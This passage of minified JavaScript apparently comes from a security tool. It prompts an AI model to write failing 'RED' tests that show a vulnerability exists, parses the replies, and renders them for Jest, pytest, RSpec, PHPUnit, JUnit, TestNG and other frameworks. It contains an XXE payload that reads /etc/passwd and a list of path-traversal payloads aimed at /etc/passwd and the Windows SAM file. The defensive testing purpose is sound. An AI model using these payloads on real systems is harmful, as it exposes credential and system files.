});`}}var VR=s(()=>{I1()});class b3{aiClient=null;aiConfig;constructor(X){this.aiConfig=X}async getClient(){if(!this.aiClient){let X={provider:this.aiConfig.provider||"anthropic",apiKey:this.aiConfig.apiKey||"",model:this.aiConfig.model||"claude-3-sonnet",temperature:this.aiConfig.temperature,maxTokens:this.aiConfig.maxTokens,useVendedCredentials:this.aiConfig.useVendedCredentials};this.aiClient=await qX(X)}return this.aiClient}async generateTests(X,J,Q){try{U.info(`Generating AI-powered tests for ${X.type} vulnerability`);let Y=this.constructTestGenerationPrompt(X,J,Q),W=await this.getClient(),G={provider:this.aiConfig.provider||"anthropic",apiKey:this.aiConfig.apiKey||"",model:this.aiConfig.model||"claude-3-sonnet"},H=sF({},G),z=await W.complete(Y,{maxTokens:H});if(U.info(`AI response length: ${z.length} characters, maxTokens: ${H}`),z.length>1000)U.debug("Response tail (last 200 chars):",z.substring(z.length-200));let $=this.parseTestSuite(z);if(!$)return U.warn("Failed to parse test suite from AI response, returning failure"),{success:!1,testCode:"",framework:J.testFramework||"jest",error:"Failed to parse AI response - response may be truncated"};let V=this.generateTestCode($,J);return{success:!0,testSuite:$,testCode:V,framework:J.testFramework||"jest"}}catch(Y){return U.error("AI test generation failed",Y),{success:!1,testCode:"",framework:J.testFramework||"jest",error:Y instanceof Error?Y.message:"Unknown error"}}}constructTestGenerationPrompt(X,J,Q){return`You are an expert security test engineer. Generate RED tests for a security vulnerability to prove it exists.

## Vulnerability Details:
- Type: ${X.type}
- Severity: ${X.severity}
- File: ${X.filePath||"unknown"}
- Line: ${X.line}
- Description: ${X.description}
- Message: ${X.message}
${X.remediation?`- Remediation: ${X.remediation}`:""}

## Test Requirements (RFC-060):
1. Generate RED tests that prove the vulnerability exists:
   - Each test should FAIL on the current vulnerable code
   - Each test should PASS once the vulnerability is fixed
   - Tests must use ${J.testFramework||"jest"} framework
   - Follow framework-specific best practices and idioms

2. Determine how many RED tests are needed based on the vulnerability:
   - Simple vulnerabilities: Generate 1 RED test
   - Complex vulnerabilities: Generate multiple RED tests (2-5 recommended, up to 10 max)
   - Examples of when multiple tests are needed:
     * Multi-vector attacks (e.g., SQL injection via multiple inputs)
     * Different exploit techniques for same vulnerability type
     * Edge cases that must all be addressed to fully fix the vulnerability

3. Use ${J.language||"javascript"} language
4. Tests must be executable and use actual attack vectors
5. Include proper assertions to validate security

${Q?`## Vulnerable Code:
\`\`\`${J.language}
${Q}
\`\`\``:""}

## Response Format:
IMPORTANT: Return ONLY valid JSON. Keep test code CONCISE (max 10-15 lines per test).
Focus on the core vulnerability check, not elaborate setup.

For a single RED test, return:
{
  "red": {
    "testName": "short descriptive name",
    "testCode": "concise test code (10-15 lines max)",
    "attackVector": "malicious input",
    "expectedBehavior": "should_fail_on_vulnerable_code"
  }
}

For multiple RED tests (complex vulnerabilities), return:
{
  "redTests": [
    {
      "testName": "first attack vector name",
      "testCode": "test code",
      "attackVector": "first malicious input",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "second attack vector name",
      "testCode": "test code",
      "attackVector": "second malicious input",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    }
  ]
}

Keep ALL strings properly escaped. Avoid long test code.
Return ONLY the JSON, no explanations.`}parseTestSuite(X){try{let J=null,Q=X.match(/```json\s*([\s\S]*?)```/);if(Q)J=Q[1].trim();if(!J){let $=X.match(/```[\s\S]*?\n([\s\S]*?)```/);if($)J=$[1].trim()}if(!J)J=this.extractJsonFromText(X);if(!J&&X.trim().startsWith("{"))J=X.trim();if(!J)return U.error("No JSON found in AI response. Response preview:",X.substring(0,200)),null;U.debug(`Extracted JSON string length: ${J.length} characters`),J=J.replace(/^\s*```\s*json?\s*/gm,"").replace(/\s*```\s*$/gm,"").trim();let Y=(J.match(/\{/g)||[]).length,W=(J.match(/\}/g)||[]).length;if(Y>W)U.warn(`Fixing unclosed JSON structure: ${Y} open, ${W} closed`),J+="}".repeat(Y-W);let G=!1;try{JSON.parse(J),G=!0}catch{}if(!G&&this.isActuallyTruncatedString(J)){U.warn("JSON appears truncated mid-string, attempting to close");let $=(J.match(/\[/g)||[]).length,V=(J.match(/\]/g)||[]).length;if(J+='"',$>V)J+="]".repeat($-V);if(Y=(J.match(/\{/g)||[]).length,W=(J.match(/\}/g)||[]).length,Y>W)J+="}".repeat(Y-W)}let H;try{H=JSON.parse(J)}catch($){return U.error("Failed to parse JSON after cleanup attempts:",$),U.debug("Attempted to parse:",J.substring(0,500)),null}if(!H.red&&!H.redTests)return U.error("Invalid test suite structure. No RED test(s) found. Keys:",Object.keys(H)),null;if(H.redTests)U.info(`Successfully parsed ${H.redTests.length} RED tests for complex vulnerability`);else if(H.red)U.info("Successfully parsed single RED test");if(H.green||H.refactor)U.warn("Response contained GREEN/REFACTOR tests - stripping per RFC-060 (VALIDATE phase is RED-only)");let z={};if(H.redTests&&Array.isArray(H.redTests))z.redTests=H.redTests.map(($)=>({testName:$.testName||"RED Test",testCode:$.testCode||"// Test code truncated",attackVector:$.attackVector||"Unknown",expectedBehavior:"should_fail_on_vulnerable_code"}));else if(H.red)z.red={testName:H.red.testName||"Vulnerability Test",testCode:H.red.testCode||"// Test code truncated",attackVector:H.red.attackVector||"Unknown",expectedBehavior:"should_fail_on_vulnerable_code"};return z}catch(J){return U.error("Failed to parse AI response:",J),U.debug("Response that failed to parse:",X.substring(0,500)),null}}generateTestCode(X,J){let Q=J.testFramework||"jest",Y=J.language||"javascript";if(Y==="javascript"||Y==="typescript")return this.generateJavaScriptTests(X,Q);else if(Y==="python")return this.generatePythonTests(X);else if(Y==="ruby")return this.generateRubyTests(X);else if(Y==="php")return this.generatePHPTests(X);else if(Y==="elixir")return this.generateElixirTests(X);return this.generateJavaScriptTests(X,Q)}generateJavaScriptTests(X,J){let Q=[];if(X.redTests&&Array.isArray(X.redTests))Q.push(...X.redTests);else if(X.red)Q.push(X.red);if(Q.length===0)return U.error("No RED tests found in test suite"),"// ERROR: No RED tests generated";let Y=Q.map((W)=>`
  // RED Test: ${W.testName}
  ${W.testCode}`).join(`
`);if(J==="jest"||J==="mocha"||J==="vitest")return`
describe('Security Vulnerability Tests', () => {${Y}
});`;return Y}generatePythonTests(X){let J=[];if(X.redTests&&Array.isArray(X.redTests))J.push(...X.redTests);else if(X.red)J.push(X.red);if(J.length===0)return U.error("No RED tests found in test suite"),"# ERROR: No RED tests generated";return`
import unittest

class SecurityVulnerabilityTests(unittest.TestCase):${J.map((Y)=>`
    # RED Test: ${Y.testName}
    ${Y.testCode}`).join(`
`)}

if __name__ == '__main__':
    unittest.main()`}generateRubyTests(X){let J=[];if(X.redTests&&Array.isArray(X.redTests))J.push(...X.redTests);else if(X.red)J.push(X.red);if(J.length===0)return U.error("No RED tests found in test suite"),"# ERROR: No RED tests generated";return`
require 'rspec'

RSpec.describe 'Security Vulnerability Tests' do${J.map((Y)=>`
  # RED Test: ${Y.testName}
  ${Y.testCode}`).join(`
`)}
end`}generatePHPTests(X){let J=[];if(X.redTests&&Array.isArray(X.redTests))J.push(...X.redTests);else if(X.red)J.push(X.red);if(J.length===0)return U.error("No RED tests found in test suite"),"// ERROR: No RED tests generated";return`
<?php
use PHPUnit\\Framework\\TestCase;

class SecurityVulnerabilityTest extends TestCase {${J.map((Y)=>`
    // RED Test: ${Y.testName}
    ${Y.testCode}`).join(`
`)}
}`}generateElixirTests(X){let J=[];if(X.redTests&&Array.isArray(X.redTests))J.push(...X.redTests);else if(X.red)J.push(X.red);if(J.length===0)return U.error("No RED tests found in test suite"),"# ERROR: No RED tests generated";return`
defmodule SecurityVulnerabilityTest do
  use ExUnit.Case
${J.map((Y)=>`
  # RED Test: ${Y.testName}
  ${Y.testCode}`).join(`
`)}
end`}isActuallyTruncatedString(X){let J=!1,Q=!1;for(let Y=0;Y<X.length;Y++){let W=X[Y];if(Q){Q=!1;continue}if(W==="\\"&&J){Q=!0;continue}if(W==='"')J=!J}return J&&!X.trim().endsWith('"}')}extractJsonFromText(X){let J=[],Q=0,Y=!1,W=!1,G=-1;for(let $=0;$<X.length;$++){let V=X[$],K=$>0?X[$-1]:"";if(W){W=!1;continue}if(V==="\\"&&Y){W=!0;continue}if(V==='"'&&!W){Y=!Y;continue}if(!Y){if(V==="{"){if(Q===0)G=$;Q++}else if(V==="}"){if(Q--,Q===0&&G!==-1)J.push({start:G,end:$+1}),G=-1}}}let H=null,z=0;for(let $ of J){let V=X.substring($.start,$.end);try{if(JSON.parse(V),V.length>z)H=V,z=V.length}catch{}}return H}}var KR=s(()=>{I1();_7();C3()});class v3{frameworkDetector;coverageAnalyzer;issueInterpreter;aiConfig;baseGenerator;aiGenerator;useAIGeneration;constructor(X,J,Q,Y){this.frameworkDetector=X;this.coverageAnalyzer=J;this.issueInterpreter=Q;this.aiConfig=Y;if(this.baseGenerator=new k3,this.useAIGeneration=!!Y&&process.env.DISABLE_AI_TEST_GEN!=="true",this.useAIGeneration&&Y)this.aiGenerator=new b3(Y)}extractRedTests(X){let J=[];if(X.redTests&&Array.isArray(X.redTests))J.push(...X.redTests);else if(X.red)J.push(X.red);if(J.length===0)U.warn("No RED tests found in test suite");return J}async detectFrameworksFromStructure(X){let J=[],Q=Object.keys(X).filter((W)=>W.endsWith("package.json"));for(let W of Q)try{let G=JSON.parse(X[W]),H=await this.frameworkDetector.detectFromPackageJson(G);J.push(...H.frameworks)}catch(G){}if(X["requirements.txt"]){let W=X["requirements.txt"];if(W.includes("pytest"))J.push({name:"pytest",version:this.extractVersion(W,"pytest"),type:"unit",confidence:0.9,detectionMethod:"dependency"})}if(X.Gemfile){let W=X.Gemfile;if(W.includes("minitest"))J.push({name:"minitest",version:this.extractVersion(W,"minitest"),type:"unit",confidence:0.9,detectionMethod:"dependency"});if(W.includes("rspec"))J.push({name:"rspec",version:this.extractVersion(W,"rspec"),type:"unit",confidence:0.9,detectionMethod:"dependency"})}if(X["pom.xml"]){let W=X["pom.xml"];if(W.includes("org.junit.jupiter"))J.push({name:"junit5",version:this.extractVersion(W,"junit-jupiter")||"5.9.0",type:"unit",confidence:0.95,detectionMethod:"dependency"});else if(W.includes("org.testng"))J.push({name:"testng",version:this.extractVersion(W,"testng")||"7.8.0",type:"unit",confidence:0.95,detectionMethod:"dependency"});else if(W.includes("junit")&&W.includes("<version>4"))J.push({name:"junit",version:this.extractVersion(W,"junit")||"4.13",type:"unit",confidence:0.9,detectionMethod:"dependency"});if(W.includes("spring-boot-starter-test")){let G=J.find((H)=>H.name==="junit5"||H.name==="junit");if(G)G.companions=["spring-boot"];else J.push({name:"junit5",version:this.extractVersion(W,"junit-jupiter")||"5.9.0",type:"unit",confidence:0.9,detectionMethod:"dependency",companions:["spring-boot"]})}}if(X["composer.json"])try{let W=JSON.parse(X["composer.json"]),G=W["require-dev"]||{},H=W.require||{};if(G["pestphp/pest"]){if(J.push({name:"pest",version:G["pestphp/pest"],type:"unit",confidence:0.95,detectionMethod:"dependency",companions:[]}),G["pestphp/pest-plugin-laravel"]||H["laravel/framework"])J[J.length-1].companions=["laravel"]}else if(G["phpunit/phpunit"]){if(J.push({name:"phpunit",version:G["phpunit/phpunit"],type:"unit",confidence:0.95,detectionMethod:"dependency",companions:[]}),H["laravel/framework"])J[J.length-1].companions=["laravel"];else if(H["symfony/framework-bundle"])J[J.length-1].companions=["symfony"]}}catch(W){}if(X["mix.exs"]){let W=X["mix.exs"];if(W.includes("ex_unit")||W.includes("ExUnit"))J.push({name:"exunit",version:"builtin",type:"unit",confidence:0.95,detectionMethod:"dependency"})}let Y=Object.keys(X).filter((W)=>W.includes("jest.config")||W.includes("vitest.config")||W.includes("karma.conf")||W.includes(".mocharc"));if(Y.length>0){let W=await this.frameworkDetector.detectFromConfigFiles(Y);J.push(...W.frameworks)}return{frameworks:J}}extractVersion(X,J){let Q=X.match(new RegExp(`${J}[=~><\\s]+([\\"']?)([\\d\\.\\w-]+)\\1`));return Q?Q[2]:"unknown"}async generateAdaptiveTests(X,J){try{U.info("AdaptiveTestGenerator: generateAdaptiveTests called"),U.info("Vulnerability:",JSON.stringify(X)),U.info("RepoStructure keys:",Object.keys(J));let Q=await this.detectFrameworksFromStructure(J);U.info("Framework detection result:",JSON.stringify(Q));let Y=this.selectPrimaryFramework(Q.frameworks,X.file);if(U.info("Selected primary framework:",JSON.stringify(Y)),this.useAIGeneration&&this.aiGenerator)return U.info("Using AI-based test generation"),this.generateAITests(X,J,Y);if(!Y)return U.info("No primary framework detected, generating generic tests"),this.generateGenericTests(X);let W=await this.analyzeCoverage(J,X.file||""),G=this.detectConventions(J,Y),H=await this.generateFrameworkSpecificTests(X,Y,G,W),z=await this.generateTestSuite(X,Y);return{success:!0,framework:Y.name.toLowerCase(),testCode:H,testSuite:z,suggestedFileName:this.suggestFileName(X.file||"",G),notes:this.generateNotes(Y,W,G)}}catch(Q){return U.error("Error generating adaptive tests",Q),{success:!1,framework:"unknown",testCode:"",error:Q instanceof Error?Q.message:"Unknown error"}}}selectPrimaryFramework(X,J){if(X.length===0)return null;if(X.length===1)return X[0];let Q=J?.split(".").pop()?.toLowerCase(),W={js:["jest","vitest","mocha","jasmine"],ts:["jest","vitest","mocha"],tsx:["jest","vitest","@testing-library/react"],jsx:["jest","vitest","@testing-library/react"],py:["pytest","unittest","nose2"],rb:["rspec","minitest"],php:["phpunit","pest","codeception"],java:["junit","testng"],ex:["exunit"],exs:["exunit"]}[Q||""]||[];for(let G of W){let H=X.find((z)=>z.name.toLowerCase()===G||z.name.toLowerCase().includes(G));if(H)return H}return X.sort((G,H)=>H.confidence-G.confidence)[0]}async analyzeCoverage(X,J){let Q=Object.keys(X).filter((z)=>z.includes("coverage")||z.includes("lcov")||z.includes(".coverage"));if(Q.length===0)return{hasData:!1};let Y=null;for(let z of Q){let $=X[z];if(z.includes("lcov")){Y=await this.coverageAnalyzer.parseLcov($);break}else if(z.includes(".coverage")||z.endsWith(".json"))try{Y=await this.coverageAnalyzer.parseCoveragePy($);break}catch(V){}}if(!Y)return{hasData:!1};let W=await this.coverageAnalyzer.findCoverageGaps(Y),G=Y.files?.find((z)=>z.path===J||z.path.endsWith(J)),H=W?await this.coverageAnalyzer.recommendTestPriorities(W):[];return{hasData:!0,fileCoverage:G,gaps:W,recommendations:H}}detectConventions(X,J){let Q=Object.entries(X).filter(([W])=>W.match(/\.(test|spec)\.(js|ts|jsx|tsx|py|rb|php|java|ex|exs)$/)||W.includes("__tests__")||W.includes("test_")||W.includes("_test")),Y={style:"unknown",assertionStyle:"unknown",fileNaming:"unknown",testDirectory:"unknown",imports:[],helpers:[],companions:J.companions||[]};for(let[W,G]of Q){if(G.includes("describe(")&&G.includes("it("))Y.style="bdd";else if(G.includes("test(")&&!G.includes("describe("))Y.style="tdd";if(G.includes("expect(")&&G.includes(".to."))Y.assertionStyle="chai-expect";else if(G.includes("expect(")&&G.includes(".toBe"))Y.assertionStyle="jest-expect";else if(G.includes("assert."))Y.assertionStyle="assert";else if(G.includes("_(")&&G.includes(".must_")||G.includes(".wont_"))Y.assertionStyle="minitest";if(W.includes(".test."))Y.fileNaming="test";else if(W.includes(".spec."))Y.fileNaming="spec";else if(W.includes("__tests__"))Y.fileNaming="__tests__";else if(W.includes("test_"))Y.fileNaming="test_prefix";let H=G.matchAll(/(?:import|require)\s*(?:\{[^}]+\}|\S+)\s*from\s*['"]([^'"]+)['"]/g);for(let z of H)if(z[1].includes("helper")||z[1].includes("setup"))Y.helpers.push(z[0]);if(G.includes("beforeEach(setup")||G.includes("afterEach(cleanup")){let z=G.match(/beforeEach\((\w+)\)/),$=G.match(/afterEach\((\w+)\)/);if(z)Y.helpers.push(`beforeEach(${z[1]})`);if($)Y.helpers.push(`afterEach(${$[1]})`)}}return Y}async generateFrameworkSpecificTests(X,J,Q,Y){let W=J.name.toLowerCase(),G=X.type.toUpperCase();if(X.type==="cross_site_request_forgery")G="CSRF";else if(X.type==="xss")G="XSS";let H={vulnerabilityType:G,language:this.getLanguageFromFramework(W),testFramework:this.mapToBaseFramework(W),includeE2E:!1},z=await this.baseGenerator.generateTestSuite(X,H);if(!z.success||!z.testSuite)if(U.error("Base test generation failed",{success:z.success,error:z.error,vulnerability:X.type}),X.type==="xml_external_entities")z.testSuite={red:{testName:"should be vulnerable to xml external entities (RED)",testCode:"// Test XXE vulnerability",attackVector:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',expectedBehavior:"should_fail_on_vulnerable_code"},green:{testName:"should prevent xml external entities (GREEN)",testCode:"// Test XXE prevention",validInput:'<?xml version="1.0"?><foo>bar</foo>',expectedBehavior:"should_pass_on_fixed_code"},refactor:{testName:"should maintain functionality after security fix",testCode:"// Test normal XML processing",functionalValidation:["XML parsing works correctly","Valid XML returns expected data"],expectedBehavior:"should_pass_on_both_versions"}},z.success=!0;else throw Error(`Failed to generate base test suite: ${z.error||"Unknown error"}`);let $=this.transformToFrameworkSyntax(z.testSuite,W,Q,X,J);if(Y.hasData&&Y.fileCoverage)$=this.addCoverageAwareTests($,Y);if(Q.helpers.length>0)$=this.addHelperImports($,Q.helpers);return $}transformToFrameworkSyntax(X,J,Q,Y,W){switch(J){case"vitest":return this.generateVitestTests(X,Q,Y);case"mocha":return this.generateMochaTests(X,Q,Y);case"pytest":return this.generatePytestTests(X,Q,Y);case"rspec":return this.generateRSpecTests(X,Q,Y);case"minitest":return this.generateMinitestTests(X,Q,Y);case"exunit":return this.generateExUnitTests(X,Q,Y);case"phpunit":return this.generatePHPUnitTests(X,Q,Y,W);case"pest":return this.generatePestTests(X,Q,Y,W);case"jest":return this.generateJestTests(X,Q,Y);case"junit5":return this.generateJUnit5Tests(X,Q,Y);case"testng":return this.generateTestNGTests(X,Q,Y);default:return this.generateGenericTestCode(X,Y)}}generateVitestTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.(tsx?|jsx?)$/,"")||"Component",W=Q.file?.endsWith(".tsx")||Q.file?.endsWith(".jsx")||!1,G=this.extractRedTests(X);if(G.length===0)return"// ERROR: No RED tests found in test suite";let H=(V)=>{let K=V.match(/test\([^{]+\{([\s\S]*)\}\);?$/);return K?K[1].trim():V},z=W?`import { describe, test, expect, beforeEach, afterEach } from "vitest";
import { render, screen } from "@testing-library/react";
import { ${Y} } from "${this.getRelativeImportPath(Q.file||"")}";`:`import { describe, test, expect } from "vitest";
import { ${Y} } from "${this.getRelativeImportPath(Q.file||"")}";`,$=G.map((V)=>`
  test("${V.testName}", async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = "${V.attackVector}";
    ${H(V.testCode)}
  });`).join(`
`);return`${z}

describe("${Y} ${Q.type} vulnerability tests", () => {
  ${J.helpers.length>0?J.helpers.join(`
  `):""}
${$}
});`}generateMochaTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.js$/,"")||"module",W=J.assertionStyle==="assert"?"assert":"chai",G=this.extractRedTests(X);if(G.length===0)return"// ERROR: No RED tests found in test suite";let H=W==="chai"?'const { expect } = require("chai");':'const assert = require("assert");',z=W==="chai"?(K,Z,q)=>K?`expect(${Z}).to.include(${q})`:`expect(${Z}).to.not.include(${q})`:(K,Z,q)=>K?`assert(${Z}.includes(${q}))`:`assert(!${Z}.includes(${q}))`,$="it",V=G.map((K)=>`
  ${$}("${K.testName}", async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = "${K.attackVector}";
    const result = await ${Y}(maliciousInput);
    ${z(!1,"result",'"syntax error"')};
  });`).join(`
`);return`${H}
const { ${Y} } = require("${this.getRelativeRequirePath(Q.file||"")}");

describe("${Y.charAt(0).toUpperCase()+Y.slice(1)} ${Q.type==="sql_injection"?"SQL injection":Q.type.replace(/_/g," ").toLowerCase()} tests", () => {${V}
});`}generatePytestTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.py$/,"")||"module",W=Y.split("_").map((z)=>z.charAt(0).toUpperCase()+z.slice(1)).join(""),G=this.extractRedTests(X);if(G.length===0)return"# ERROR: No RED tests found in test suite";let H=G.map((z,$)=>`
    def test_${Q.type.toLowerCase()}_vulnerability_${$+1}(self):
        """${z.testName}"""
        # RED: Demonstrate vulnerability exists
        malicious_input = "${z.attackVector}"
        result = ${Y}(malicious_input)
        assert "root" not in result
        assert "permission denied" not in result.lower()`).join(`
`);return`import pytest
from ${Q.file?.replace(/\.py$/,"").replace(/\//g,".")||"module"} import *

@pytest.mark.security
class Test${W}${Q.type.replace(/_/g,"")}:
    """Tests for ${Q.type} vulnerability in ${Y}"""
${H}`}generateMinitestTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.rb$/,"").split("_").map((H)=>H.charAt(0).toUpperCase()+H.slice(1)).join("")||"Module",W=this.extractRedTests(X);if(W.length===0)return"# ERROR: No RED tests found in test suite";let G=W.map((H,z)=>`
    it "${H.testName}" do
      # RED: Demonstrate vulnerability exists
      malicious_input = "${H.attackVector}"
      result = ${Y}.new.process(malicious_input)
      _(result).wont_include "Permission denied"
      _(result).wont_include "syntax error"
    end`).join(`
`);return`require "minitest/autorun"
require "minitest/spec"
require_relative "${this.getRelativeRequirePath(Q.file||"")}"

describe ${Y} do
  describe "${Q.type} vulnerability tests" do${G}
  end
end`}generateRSpecTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.rb$/,"").split("_").map((z)=>z.charAt(0).toUpperCase()+z.slice(1)).join("")||"Module",W=Q.file?.includes("controller")?Y:`${Y}Controller`,G=this.extractRedTests(X);if(G.length===0)return"# ERROR: No RED tests found in test suite";let H=G.map((z,$)=>`
    context "when vulnerable to ${Q.type.toLowerCase()} - Test ${$+1} (RED)" do
      it "${z.testName}" do
        # RED: Demonstrate vulnerability exists
        malicious_input = "${z.attackVector}"

        # For SQL injection in Rails controller
        params = { user: { id: malicious_input } }

        # This test should pass BEFORE the fix
        expect {
          post :update, params: params
        }.not_to raise_error

        # The vulnerability allows the attack
        expect(response).to have_http_status(:ok)
      end
    end`).join(`
`);return`require 'rails_helper'

RSpec.describe ${W}, type: :controller do
  describe "${Q.type} vulnerability tests" do${H}
  end
end`}generateExUnitTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.ex$/,"").split("_").map((H)=>H.charAt(0).toUpperCase()+H.slice(1)).join("")||"Module",W=this.extractRedTests(X);if(W.length===0)return"# ERROR: No RED tests found in test suite";let G=W.map((H,z)=>`
    test "${H.testName}" do
      # RED: Demonstrate vulnerability exists
      malicious_input = "${H.attackVector}"
      assert {:ok, result} = ${Y}.process(malicious_input)
      refute String.contains?(result, "error")
    end`).join(`
`);return`defmodule ${Y}Test do
  use ExUnit.Case
  alias ${Y}

  describe "${Q.type.toLowerCase()} vulnerability" do${G}
  end
end`}generatePHPUnitTests(X,J,Q,Y){let W=Q.file?.split("/").pop()?.replace(/\.php$/,"")||"Class",G=Y?.version||"8.0",H=G.match(/(\d+)\./),z=H?parseInt(H[1]):8,$=z>=9,V=this.extractNamespaceFromPath(Q.file||""),K=V?`${V}\\${W}`:W,Z=Y?.companions?.includes("laravel"),q=Y?.companions?.includes("symfony");if(U.info("PHPUnit generation context",{version:G,majorVersion:z,useAttributes:$,companions:Y?.companions,isLaravel:Z,isSymfony:q}),Z)return this.generateLaravelPHPUnitTests(X,J,Q,W,Y);if(q)return this.generateSymfonyPHPUnitTests(X,J,Q,W);let B=this.extractRedTests(X);if(B.length===0)return`<?php
// ERROR: No RED tests found in test suite`;let M=$?`use PHPUnit\\Framework\\Attributes\\DataProvider;
use PHPUnit\\Framework\\Attributes\\Test;
use PHPUnit\\Framework\\Attributes\\Group;
`:"",O=$?"#[Group('security')]":`/**
 * @group security
 */`,R=$?"#[Test]":"",I=B.map((F,T)=>`
    ${R}
    public function test${Q.type.replace(/_/g,"")}Vulnerability${T+1}(): void
    {
        // RED: ${F.testName}
        $maliciousInput = '${F.attackVector}';
        $result = $this->instance->process($maliciousInput);

        // Vulnerability should allow the attack to succeed
        $this->assertStringNotContainsString('Permission denied', $result);
        $this->assertStringNotContainsString('Invalid input', $result);
    }`).join(`
`);return`<?php
${V?`namespace Tests\\${V};

`:""}use PHPUnit\\Framework\\TestCase;
${M}use ${K};
use App\\Exceptions\\SecurityException;

${O}
class ${W}${Q.type.replace(/_/g,"")}Test extends TestCase
{
    private $instance;

    protected function setUp(): void
    {
        $this->instance = new ${W}();
    }
${I}
}`}generateJestTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.[jt]sx?$/,"")||"module",W=this.extractRedTests(X);if(W.length===0)return"// ERROR: No RED tests found in test suite";let G=J.style==="bdd"?"describe":"",H=J.style==="bdd"?"it":"test",z=`const { ${Y} } = require('${this.getRelativeRequirePath(Q.file||"")}');`,$=W.map((K)=>`
  ${H}('${K.testName}', async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = '${K.attackVector}';
    const result = await ${Y}(maliciousInput);
    expect(result).not.toContain('error');
  });`).join(`
`),V=`
${G?`describe('${Y} ${Q.type} tests', () => {`:""}${$}
${G?"});":""}`;return z+`
`+V}generateJUnit5Tests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.java$/,"")||"Class",W=this.extractPackageName(Q.file||""),G=J.companions?.includes("spring-boot"),H=this.extractRedTests(X);if(H.length===0)return"// ERROR: No RED tests found in test suite";let z=`package ${W};

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import static org.junit.jupiter.api.Assertions.*;
${G?`
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.beans.factory.annotation.Autowired;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;
`:""}`,$=G?`
@SpringBootTest
@AutoConfigureMockMvc
public class ${Y}${Q.type.replace(/_/g,"")}Test {
    @Autowired
    private MockMvc mockMvc;

    private ${Y} instance;

    @BeforeEach
    void setUp() {
        instance = new ${Y}();
    }`:`
public class ${Y}${Q.type.replace(/_/g,"")}Test {
    private ${Y} instance;

    @BeforeEach
    void setUp() {
        instance = new ${Y}();
    }`,V=H.map((K,Z)=>`
    @Test
    @DisplayName("${K.testName}")
    void testVulnerability${Z+1}() {
        // RED: Demonstrate vulnerability exists
        String maliciousInput = "${K.attackVector}";

        ${G?`// Test via Spring MVC
        assertDoesNotThrow(() -> {
            mockMvc.perform(get("/api/endpoint")
                    .param("input", maliciousInput))
                    .andExpect(status().isOk());
        });`:`// Direct method test
        assertDoesNotThrow(() -> {
            instance.process(maliciousInput);
        });`}
    }`).join(`
`);return`${z}

${$}
${V}
}`}generateTestNGTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.java$/,"")||"Class",W=this.extractPackageName(Q.file||""),G=this.extractRedTests(X);if(G.length===0)return"// ERROR: No RED tests found in test suite";let H=G.map(($,V)=>`
    @Test(description = "${$.testName}")
    public void testVulnerability${V+1}() {
        // RED: Demonstrate vulnerability exists
        String maliciousInput = "${$.attackVector}";

        // This should succeed with vulnerable code
        try {
            String result = instance.process(maliciousInput);
            assertNotNull(result);
            ${Q.type==="xml_external_entities"?`// If XXE, might contain system file content
            assertFalse(result.contains("root:"));`:`// Verify the vulnerability is exploitable
            assertTrue(result != null);`}
        } catch (Exception e) {
            fail("Should not throw exception with vulnerable code");
        }
    }`).join(`
`),z=Q.type==="path_traversal"?`

    @DataProvider(name = "maliciousFilePaths")
    public Object[][] maliciousFilePaths() {
        return new Object[][] {
            {"../../../etc/passwd"},
            {"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam"},
            {"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
            {"....//....//....//etc/passwd"}
        };
    }

    @Test(dataProvider = "maliciousFilePaths",
          description = "Test path traversal with multiple payloads")
    public void testPathTraversal(String maliciousPath) {
        // Test with various path traversal payloads
        assertThrows(SecurityException.class, () -> {
            instance.readFile(maliciousPath);
        });
    }`:"";return`package ${W};

import org.testng.annotations.Test;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.DataProvider;
import static org.testng.Assert.*;

/**
 * Security tests for ${Q.type.replace(/_/g," ")} vulnerability
 */
@Test(groups = {"security"})
public class ${Y}${Q.type.replace(/_/g,"")}Test {
    private ${Y} instance;

    @BeforeMethod
    public void setUp() {
        instance = new ${Y}();
    }
${H}${z}
}`}generateGenericTestCode(X,J){if(!X)return`// Generic test template - adapt to your test framework
// File: ${J.file}
// Vulnerability: ${J.type}

// RED Test: Test vulnerability exists
function testVulnerabilityExists() {
  // TODO: Call vulnerable function with malicious input
  // Example: const result = vulnerableFunction(maliciousInput);
  // Assert that vulnerability is exploitable
}`;let Q=this.extractRedTests(X);if(Q.length===0)return`// Generic test template - adapt to your test framework
// File: ${J.file}
// Vulnerability: ${J.type}

// ERROR: No RED tests found in test suite
// RED Test: Test vulnerability exists
function testVulnerabilityExists() {
  // TODO: Call vulnerable function with malicious input
  // Example: const result = vulnerableFunction(maliciousInput);
  // Assert that vulnerability is exploitable
}`;let Y=Q.map((W,G)=>`
// RED Test ${G+1}: ${W.testName}
// Purpose: Demonstrate the vulnerability exists
function testVulnerability${G+1}() {
  const maliciousInput = "${W.attackVector}";
  // TODO: Call vulnerable function with malicious input
  // TODO: Assert that attack succeeds (should fail when fixed)
}`).join(`
`);return`// Generic test template - adapt to your test framework
// File: ${J.file}
// Vulnerability: ${J.type}
